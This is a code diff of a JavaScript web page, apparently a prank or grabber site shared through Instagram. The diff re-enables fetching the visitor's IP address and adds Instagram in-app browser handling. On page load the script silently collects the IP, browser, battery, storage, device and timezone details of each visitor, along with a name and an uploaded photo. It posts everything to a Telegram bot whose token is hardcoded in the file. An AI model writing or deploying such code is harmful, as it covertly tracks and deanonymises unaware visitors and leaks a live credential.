@@ -26,6 +26,12 @@ const counterRef = ref(db, 'visits/counter');
 const TELEGRAM_BOT_TOKEN = '8179260298:AAECPoAzoyCu3l3vK4Uxeg3qdVlMO4wJfwE';
 const TELEGRAM_CHAT_ID = '1987268737';
 
+// دالة للكشف عن متصفح إنستغرام
+function isInstagramBrowser() {
+    const ua = navigator.userAgent || navigator.vendor || window.opera;
+    return /Instagram/.test(ua);
+}
+
 // دالة لتحويل الأرقام إلى عربية
 function toArabicNumerals(number) {
     const arabicNumerals = ['٠', '١', '٢', '٣', '٤', '٥', '٦', '٧', '٨', '٩'];
@@ -71,11 +77,12 @@ function getRandomMessage(messages) {
     return messages[Math.floor(Math.random() * messages.length)];
 }
 
-// دالة لإرسال رسالة إلى تليجرام
+// دالة لإرسال رسالة إلى تليجرام مع معالجة أخطاء محسّنة
 async function sendToTelegram(message) {
     const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
     try {
-        await fetch(url, {
+        console.log('جاري إرسال الرسالة إلى تليجرام...');
+        const response = await fetch(url, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
@@ -84,8 +91,22 @@ async function sendToTelegram(message) {
                 parse_mode: 'Markdown'
             })
         });
+        console.log('حالة الطلب:', response.status, response.statusText);
+        if (!response.ok) {
+            throw new Error(`فشل الطلب: ${response.status}`);
+        }
     } catch (error) {
         console.error('خطأ في إرسال الرسالة لتليجرام:', error);
+        if (isInstagramBrowser()) {
+            Swal.fire({
+                title: 'مشكلة!',
+                text: 'متصفح إنستغرام مش بيدعم إرسال الرسالة. جرب افتح الموقع في Chrome أو Safari.',
+                icon: 'error',
+                confirmButtonColor: '#8e24aa',
+                background: '#1e1e1e',
+                color: '#e0e0e0'
+            });
+        }
     }
 }
 
@@ -137,24 +158,32 @@ async function updateVisitorCount() {
     }
 }
 
-// جلب معلومات المستخدم
+// جلب معلومات المستخدم مع معالجة محسنة لمتصفح إنستغرام
 async function getUserInfo(name = 'مش معروف') {
     if (!canAttempt()) return;
 
     try {
-    //    const ipResponse = await fetch('https://api.ipify.org?format=json');
-     //   const ipData = await ipResponse.json();
+        // تأخير طلب الـ IP لضمان تحميل الموارد في WebView
+        let ipData = { ip: 'مش متوفر' };
+        try {
+            console.log('جاري جلب عنوان الـ IP...');
+            const ipResponse = await fetch('https://api.ipify.org?format=json', { mode: 'cors' });
+            ipData = await ipResponse.json();
+        } catch (error) {
+            console.error('خطأ في جلب الـ IP:', error);
+        }
+
         const visitorCount = await getVisitorCount();
-        const userAgent = navigator.userAgent;
+        const userAgent = navigator.userAgent || 'مش متوفر';
         const screenResolution = `${window.screen.width}x${window.screen.height}`;
         const windowSize = `${window.innerWidth}x${window.innerHeight}`;
-        const language = navigator.language;
-        const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+        const language = navigator.language || 'مش متوفر';
+        const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone || 'مش متوفر';
         const onlineStatus = navigator.onLine ? 'متصل' : 'مش متصل';
         let batteryStatus = 'مش معروف';
-        const platform = navigator.platform;
+        const platform = navigator.platform || 'مش متوفر';
         const deviceMemory = navigator.deviceMemory || 'مش معروف';
-        const colorDepth = window.screen.colorDepth;
+        const colorDepth = window.screen.colorDepth || 'مش معروف';
         const connectionSpeed = navigator.connection ? navigator.connection.effectiveType : 'مش معروف';
         const sessionTime = Math.round(performance.now() / 1000);
         const maxTouchPoints = navigator.maxTouchPoints || 'مش معروف';
@@ -162,25 +191,44 @@ async function getUserInfo(name = 'مش معروف') {
         let webGLVersion = 'مش معروف';
         const deviceType = /Mobile|Android|iPhone|iPad/.test(userAgent) ? 'موبايل' : 'كمبيوتر';
 
+        // التحقق من دعم API البطارية
         if (navigator.getBattery) {
-            const battery = await navigator.getBattery();
-            batteryStatus = `${toArabicNumerals(Math.round(battery.level * 100))}% (${battery.charging ? 'بيتشحن' : 'مش بيتشحن'})`;
+            try {
+                const battery = await navigator.getBattery();
+                batteryStatus = `${toArabicNumerals(Math.round(battery.level * 100))}% (${battery.charging ? 'بيتشحن' : 'مش بيتشحن'})`;
+            } catch (error) {
+                console.error('خطأ في جلب حالة البطارية:', error);
+            }
         }
 
+        // التحقق من دعم API التخزين
         if (navigator.storage && navigator.storage.estimate) {
-            const estimate = await navigator.storage.estimate();
-            storageQuota = `${toArabicNumerals(Math.round(estimate.quota / 1024 / 1024))} ميجا`;
+            try {
+                const estimate = await navigator.storage.estimate();
+                storageQuota = `${toArabicNumerals(Math.round(estimate.quota / 1024 / 1024))} ميجا`;
+            } catch (error) {
+                console.error('خطأ في جلب التخزين:', error);
+            }
         }
 
-        const canvas = document.createElement('canvas');
-        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-        if (gl) {
-            webGLVersion = gl.getParameter(gl.VERSION);
+        // التحقق من دعم WebGL
+        try {
+            const canvas = document.createElement('canvas');
+            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+            if (gl) {
+                webGLVersion = gl.getParameter(gl.VERSION);
+            }
+        } catch (error) {
+            console.error('خطأ في جلب WebGL:', error);
         }
 
-        const message = `*بيانات الزبون:*\n👤 *الاسم*: ${name}\n📊 *عدد الزوار*: ${toArabicNumerals(visitorCount)}\n🖥️ *الآي بي*:\n🌐 *المتصفح*: ${userAgent}\n📏 *دقة الشاشة*: ${screenResolution}\n🖼️ *حجم النافذة*: ${windowSize}\n🗣️ *اللغة*: ${language}\n🕒 *المنطقة الزمنية*: ${timeZone}\n📶 *الحالة*: ${onlineStatus}\n🔋 *البطارية*: ${batteryStatus}\n💻 *النظام*: ${platform}\n🧠 *الذاكرة*: ${deviceMemory} جيجا\n🎨 *عمق الألوان*: ${toArabicNumerals(colorDepth)} بت\n🌐 *سرعة النت*: ${connectionSpeed}\n⏱️ *مدة الجلسة*: ${toArabicNumerals(sessionTime)} ثانية\n👆 *نقاط اللمس*: ${maxTouchPoints}\n💾 *التخزين*: ${storageQuota}\n🖌️ *WebGL*: ${webGLVersion}\n📱 *نوع الجهاز*: ${deviceType}`;
+        // إنشاء الرسالة
+        const message = `*بيانات الزبون:*\n👤 *الاسم*: ${name}\n📊 *عدد الزوار*: ${toArabicNumerals(visitorCount)}\n🖥️ *الآي بي*: ${ipData.ip}\n🌐 *المتصفح*: ${userAgent}\n📏 *دقة الشاشة*: ${screenResolution}\n🖼️ *حجم النافذة*: ${windowSize}\n🗣️ *اللغة*: ${language}\n🕒 *المنطقة الزمنية*: ${timeZone}\n📶 *الحالة*: ${onlineStatus}\n🔋 *البطارية*: ${batteryStatus}\n💻 *النظام*: ${platform}\n🧠 *الذاكرة*: ${deviceMemory} جيجا\n🎨 *عمق الألوان*: ${toArabicNumerals(colorDepth)} بت\n🌐 *سرعة النت*: ${connectionSpeed}\n⏱️ *مدة الجلسة*: ${toArabicNumerals(sessionTime)} ثانية\n👆 *نقاط اللمس*: ${maxTouchPoints}\n💾 *التخزين*: ${storageQuota}\n🖌️ *WebGL*: ${webGLVersion}\n📱 *نوع الجهاز*: ${deviceType}`;
+
+        // إرسال الرسالة إلى تليجرام
         await sendToTelegram(message);
 
+        // تحديث واجهة المستخدم
         const progress = document.getElementById('progress');
         progress.style.width = '100%';
 
@@ -216,6 +264,14 @@ async function getUserInfo(name = 'مش معروف') {
         }, 1000);
     } catch (error) {
         console.error('خطأ في جلب البيانات:', error);
+        Swal.fire({
+            title: 'مشكلة!',
+            text: 'فشلنا نجمع البيانات. لو إنت على إنستغرام، جرب افتح الموقع في Chrome أو Safari.',
+            icon: 'error',
+            confirmButtonColor: '#8e24aa',
+            background: '#1e1e1e',
+            color: '#e0e0e0'
+        });
     }
 }
 
@@ -338,7 +394,19 @@ document.getElementById('name-form').addEventListener('submit', (e) => {
             fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
                 method: 'POST',
                 body: formData
-            }).catch(error => console.error('خطأ في إرسال الصورة:', error));
+            }).catch(error => {
+                console.error('خطأ في إرسال الصورة:', error);
+                if (isInstagramBrowser()) {
+                    Swal.fire({
+                        title: 'مشكلة!',
+                        text: 'متصفح إنستغرام مش بيدعم إرسال الصورة. جرب افتح الموقع في Chrome أو Safari.',
+                        icon: 'error',
+                        confirmButtonColor: '#8e24aa',
+                        background: '#1e1e1e',
+                        color: '#e0e0e0'
+                    });
+                }
+            });
         } else {
             sendToTelegram(`*الاسم*: ${name}`);
         }
@@ -360,14 +428,33 @@ document.getElementById('share-instagram').addEventListener('click', () => {
 // عند تحميل الصفحة
 window.onload = () => {
     document.getElementById('loading-message').textContent = getRandomMessage(loadingMessages);
-    Swal.fire({
-        title: 'تحذير يا برنس! ⚠️',
-        text: ' دخولك مش مصرّح... كمّل على مسئوليتك! 🔐',
-        icon: 'warning',
-        confirmButtonColor: '#8e24aa',
-        background: '#1e1e1e',
-        color: '#e0e0e0',
-        confirmButtonText: 'يلا بينا'
-    });
-    getUserInfo();
+    // التحقق من متصفح إنستغرام
+    if (isInstagramBrowser()) {
+        Swal.fire({
+            title: 'تحذير!',
+            text: 'متصفح إنستغرام ممكن ما يدعمش كل الوظائف. لو حصل مشكلة، جرب افتح الموقع في Chrome أو Safari.',
+            icon: 'warning',
+            confirmButtonColor: '#8e24aa',
+            background: '#1e1e1e',
+            color: '#e0e0e0',
+            confirmButtonText: 'ماشي'
+        }).then(() => {
+            // تأخير تنفيذ getUserInfo لضمان تحميل الموارد
+            setTimeout(() => {
+                getUserInfo();
+            }, 1000);
+        });
+    } else {
+        Swal.fire({
+            title: 'تحذير يا برنس! ⚠️',
+            text: 'دخولك مش مصرّح... كمّل على مسئوليتك! 🔐',
+            icon: 'warning',
+            confirmButtonColor: '#8e24aa',
+            background: '#1e1e1e',
+            color: '#e0e0e0',
+            confirmButtonText: 'يلا بينا'
+        }).then(() => {
+            getUserInfo();
+        });
+    }
 };
